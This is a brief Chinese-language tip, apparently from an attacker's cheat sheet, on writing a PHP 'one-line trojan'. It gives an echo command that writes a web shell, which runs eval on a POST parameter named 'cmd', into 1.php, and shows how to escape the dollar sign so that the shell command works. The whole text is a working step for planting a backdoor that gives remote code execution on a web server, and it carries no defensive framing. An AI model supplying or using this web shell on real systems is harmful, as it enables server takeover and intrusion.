# 01、php写入一句话木马时
```
不是
echo "<?php eval($_POST['cmd']);?>">1.php

而是
echo "<?php eval(\$_POST['cmd']);?>">1.php
```